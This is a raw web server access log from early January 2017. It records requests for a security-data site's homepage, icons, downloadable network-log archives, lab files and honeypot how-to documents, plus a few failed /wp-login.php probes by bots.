WSC,5.106.255.253,-,01/Jan/2017:22:26:15 -0800,GET /GitHub-Mark.png HTTP/1.1,304,166
WSC,5.106.255.253,-,01/Jan/2017:22:26:16 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,304,164
WSC,5.106.255.253,-,01/Jan/2017:22:26:24 -0800,GET /maccdc2012/smtp.log.gz HTTP/1.1,304,189
WSC,42.236.10.100,-,01/Jan/2017:22:34:16 -0800,GET / HTTP/1.1,200,10267
WSC,42.236.10.100,-,01/Jan/2017:22:34:16 -0800,GET /robots.txt HTTP/1.1,200,334
WSC,164.124.106.147,-,01/Jan/2017:22:42:26 -0800,GET / HTTP/1.1,200,10267
WSC,164.124.106.147,-,01/Jan/2017:22:42:27 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,164.124.106.147,-,01/Jan/2017:22:42:27 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,164.124.106.147,-,01/Jan/2017:22:42:29 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,199.16.157.181,-,01/Jan/2017:22:56:56 -0800,GET /robots.txt HTTP/1.1,200,233
WSC,199.16.157.181,-,01/Jan/2017:22:56:56 -0800,GET / HTTP/1.1,200,10211
WSC,62.81.238.27,-,01/Jan/2017:23:19:01 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,304,165
WSC,157.55.39.232,-,01/Jan/2017:23:31:41 -0800,GET /self.logs/access.log.2015-06-30.gz HTTP/1.1,200,5358
WSC,54.234.67.133,-,01/Jan/2017:23:35:09 -0800,HEAD / HTTP/1.1,301,209
WSC,54.234.67.133,-,01/Jan/2017:23:35:09 -0800,HEAD / HTTP/1.1,200,284
WSC,109.66.159.240,-,01/Jan/2017:23:40:13 -0800,GET / HTTP/1.1,200,10267
WSC,109.66.159.240,-,01/Jan/2017:23:40:13 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,109.66.159.240,-,01/Jan/2017:23:40:13 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,109.66.159.240,-,01/Jan/2017:23:40:14 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,109.66.159.240,-,01/Jan/2017:23:40:50 -0800,GET /self.logs/ HTTP/1.1,200,14700
WSC,109.66.159.240,-,01/Jan/2017:23:40:51 -0800,GET /favicon.ico HTTP/1.1,200,267
WSC,109.66.159.240,-,01/Jan/2017:23:41:04 -0800,GET /self.logs/access.log.2015-01-17.gz HTTP/1.1,200,3597
WSC,109.66.159.240,-,01/Jan/2017:23:41:17 -0800,GET /self.logs/access.log.2015-01-17.gz HTTP/1.1,200,3597
WSC,118.33.113.8,-,01/Jan/2017:23:43:25 -0800,GET / HTTP/1.1,200,10267
WSC,118.33.113.8,-,01/Jan/2017:23:43:26 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,118.33.113.8,-,01/Jan/2017:23:43:26 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,118.33.113.8,-,01/Jan/2017:23:43:26 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,118.33.113.8,-,01/Jan/2017:23:44:34 -0800,GET /maccdc2012/weird.log.gz HTTP/1.1,200,1242777
WSC,109.66.159.240,-,01/Jan/2017:23:45:02 -0800,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1,200,4557648
WSC,109.66.159.240,-,01/Jan/2017:23:45:57 -0800,GET /self.logs/ HTTP/1.1,200,14700
WSC,211.110.178.7,-,01/Jan/2017:23:46:28 -0800,GET / HTTP/1.1,200,34374
WSC,211.244.83.219,-,01/Jan/2017:23:46:29 -0800,GET / HTTP/1.1,200,34374
WSC,118.33.113.8,-,01/Jan/2017:23:47:08 -0800,GET / HTTP/1.1,200,10267
WSC,118.33.113.8,-,01/Jan/2017:23:47:09 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,118.33.113.8,-,01/Jan/2017:23:47:09 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,118.33.113.8,-,01/Jan/2017:23:47:10 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,118.33.113.8,-,01/Jan/2017:23:46:15 -0800,GET /maccdc2012/http.log.gz HTTP/1.1,200,54258816
WSC,104.200.107.62,-,01/Jan/2017:23:54:30 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,104.200.107.62,-,01/Jan/2017:23:54:35 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,104.200.107.62,-,01/Jan/2017:23:54:41 -0800,GET / HTTP/1.1,200,34374
WSC,109.66.159.240,-,01/Jan/2017:23:45:01 -0800,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1,200,549098528
WSC,121.52.146.107,-,02/Jan/2017:00:06:02 -0800,GET / HTTP/1.0,200,10267
WSC,121.52.146.107,-,02/Jan/2017:00:06:03 -0800,GET /bootstrap/img/favicon.ico HTTP/1.0,200,589
WSC,121.52.146.107,-,02/Jan/2017:00:06:04 -0800,GET /twitter-icon.png HTTP/1.0,200,27787
WSC,121.52.146.107,-,02/Jan/2017:00:06:04 -0800,GET /GitHub-Mark.png HTTP/1.0,200,7428
WSC,121.52.146.107,-,02/Jan/2017:00:08:00 -0800,GET /favicon.ico HTTP/1.0,200,268
WSC,117.200.32.210,-,02/Jan/2017:00:12:41 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,111.91.137.215,-,02/Jan/2017:00:16:51 -0800,GET / HTTP/1.1,200,10267
WSC,111.91.137.215,-,02/Jan/2017:00:16:51 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,111.91.137.215,-,02/Jan/2017:00:16:51 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,111.91.137.215,-,02/Jan/2017:00:16:52 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,87.201.213.114,-,02/Jan/2017:00:27:55 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,34291
WSC,87.201.213.114,-,02/Jan/2017:00:27:53 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,87.201.213.114,-,02/Jan/2017:00:27:55 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65874
WSC,87.201.213.114,-,02/Jan/2017:00:27:56 -0800,GET /favicon.ico HTTP/1.1,200,267
WSC,118.33.113.8,-,02/Jan/2017:00:31:41 -0800,GET / HTTP/1.1,200,10267
WSC,118.33.113.8,-,02/Jan/2017:00:31:41 -0800,GET /favicon.ico HTTP/1.1,200,267
WSC,27.5.119.139,-,02/Jan/2017:00:32:08 -0800,GET / HTTP/1.1,200,10267
WSC,27.5.119.139,-,02/Jan/2017:00:32:08 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,27.5.119.139,-,02/Jan/2017:00:32:08 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,27.5.119.139,-,02/Jan/2017:00:32:09 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,83.42.194.191,-,02/Jan/2017:00:46:00 -0800,GET / HTTP/1.1,200,10267
WSC,83.42.194.191,-,02/Jan/2017:00:46:00 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,83.42.194.191,-,02/Jan/2017:00:46:00 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,83.42.194.191,-,02/Jan/2017:00:46:01 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,109.86.71.185,-,02/Jan/2017:01:10:10 -0800,GET / HTTP/1.0,301,461
WSC,109.86.71.185,-,02/Jan/2017:01:10:10 -0800,GET / HTTP/1.0,200,34363
WSC,87.255.155.12,-,02/Jan/2017:01:18:56 -0800,GET / HTTP/1.1,200,10267
WSC,87.255.155.12,-,02/Jan/2017:01:18:56 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,87.255.155.12,-,02/Jan/2017:01:18:57 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,87.255.155.12,-,02/Jan/2017:01:18:58 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,109.64.164.19,-,02/Jan/2017:01:23:33 -0800,GET / HTTP/1.1,200,10267
WSC,109.64.164.19,-,02/Jan/2017:01:23:34 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7427
WSC,109.64.164.19,-,02/Jan/2017:01:23:34 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,140.112.24.181,-,02/Jan/2017:01:26:20 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,34291
WSC,140.112.24.181,-,02/Jan/2017:01:26:20 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65872
WSC,140.112.24.217,-,02/Jan/2017:01:26:20 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65873
WSC,140.112.24.213,-,02/Jan/2017:01:26:21 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65875
WSC,140.112.24.181,-,02/Jan/2017:01:26:21 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,65872
WSC,140.112.24.217,-,02/Jan/2017:01:26:21 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,206,262482
WSC,140.112.24.247,-,02/Jan/2017:01:26:16 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,140.112.24.223,-,02/Jan/2017:01:26:28 -0800,GET /favicon.ico HTTP/1.1,200,268
WSC,188.25.158.195,-,02/Jan/2017:01:34:38 -0800,GET / HTTP/1.1,200,10267
WSC,188.25.158.195,-,02/Jan/2017:01:34:39 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,188.25.158.195,-,02/Jan/2017:01:34:39 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,188.25.158.195,-,02/Jan/2017:01:34:39 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,1.202.222.146,-,02/Jan/2017:01:34:42 -0800,GET /favicon.ico HTTP/1.1,200,212
WSC,188.25.158.195,-,02/Jan/2017:01:35:53 -0800,GET /maccdc2012/ssl.log.gz HTTP/1.1,200,1313675
WSC,103.195.73.100,-,02/Jan/2017:01:37:32 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,103.195.73.100,-,02/Jan/2017:01:37:38 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,103.195.73.100,-,02/Jan/2017:01:37:46 -0800,GET / HTTP/1.1,200,34374
WSC,36.110.120.151,-,02/Jan/2017:01:41:53 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,46.229.164.102,-,02/Jan/2017:01:45:05 -0800,GET /robots.txt HTTP/1.1,301,465
WSC,46.229.164.102,-,02/Jan/2017:01:45:05 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,211.249.40.21,-,02/Jan/2017:01:45:45 -0800,GET / HTTP/1.1,200,34363
WSC,211.249.40.24,-,02/Jan/2017:01:48:59 -0800,GET / HTTP/1.1,200,10267
WSC,211.249.40.24,-,02/Jan/2017:01:49:01 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,121.52.146.107,-,02/Jan/2017:01:53:58 -0800,GET / HTTP/1.0,200,10267
WSC,94.139.69.2,-,02/Jan/2017:01:54:49 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,155.94.170.213,-,02/Jan/2017:02:12:00 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0,200,930799
WSC,157.55.39.75,-,02/Jan/2017:02:12:39 -0800,GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1,301,539
WSC,157.55.39.75,-,02/Jan/2017:02:12:56 -0800,GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1,404,340
WSC,211.249.40.11,-,02/Jan/2017:02:25:26 -0800,GET / HTTP/1.1,200,34363
WSC,117.201.11.139,-,02/Jan/2017:02:35:43 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,117.201.11.139,-,02/Jan/2017:02:35:49 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,117.201.11.139,-,02/Jan/2017:02:35:54 -0800,GET / HTTP/1.1,200,34374
WSC,103.195.73.100,-,02/Jan/2017:02:35:55 -0800,GET /wp-login.php HTTP/1.1,301,522
WSC,103.195.73.100,-,02/Jan/2017:02:35:56 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,103.195.73.100,-,02/Jan/2017:02:36:01 -0800,GET /wp-login.php HTTP/1.1,301,522
WSC,103.195.73.100,-,02/Jan/2017:02:36:02 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,103.195.73.100,-,02/Jan/2017:02:36:09 -0800,GET / HTTP/1.1,301,498
WSC,103.195.73.100,-,02/Jan/2017:02:36:10 -0800,GET / HTTP/1.1,200,34374
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET / HTTP/1.1,200,10267
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,340
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /apple-touch-icon.png HTTP/1.1,404,339
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,339
WSC,78.68.160.67,-,02/Jan/2017:02:43:48 -0800,GET /apple-touch-icon.png HTTP/1.1,404,339
WSC,223.102.16.121,-,02/Jan/2017:02:46:01 -0800,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,200,2928460
WSC,106.38.241.146,-,02/Jan/2017:02:55:56 -0800,GET /self.logs/ HTTP/1.1,200,14663
WSC,106.38.241.146,-,02/Jan/2017:02:56:27 -0800,GET /robots.txt HTTP/1.1,200,252
